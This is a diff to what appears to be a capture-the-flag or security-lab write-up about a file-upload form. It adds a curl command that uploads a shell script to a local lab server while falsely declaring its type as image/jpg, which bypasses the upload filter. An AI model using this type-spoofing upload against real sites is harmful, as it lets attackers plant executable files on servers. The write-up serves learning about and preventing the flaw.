@@ -8,9 +8,18 @@ We have a form with an input that allows us to upload files.
 
 # Resolve
 
-open your terminal on do a request
-create a script file
+open your terminal on do a request\
+create a script file\
+
+```
+touch script.sh
+```
+
+Use cmd curl
+
+```
 curl -X POST -F "uploaded=@/Users/tpinto-m/Desktop/script.sh;type=image/jpg" -F 'Upload=Upload' 'http://10.11.249.210/?page=upload#'
+```
 
 # Prevent
 
